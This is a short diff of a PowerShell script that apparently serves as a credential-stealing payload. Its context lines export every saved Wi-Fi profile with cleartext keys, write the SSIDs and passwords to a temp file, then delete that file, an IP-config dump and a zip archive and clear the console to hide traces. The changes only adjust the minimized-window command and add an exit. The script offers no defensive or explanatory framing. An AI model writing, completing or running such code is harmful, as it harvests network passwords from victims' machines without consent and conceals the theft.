@@ -1,5 +1,5 @@
 
-powershell -windowstyle minimized -command "Start-Sleep 1"
+powershell -windowstyle minimized
 
 
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
@@ -25,3 +25,5 @@ cls # clear console
 Remove-Item -Path "$e\wifi.txt"
 Remove-Item -Path "$e\ipcfg.txt"
 Remove-Item -Path "$zip"
+
+exit
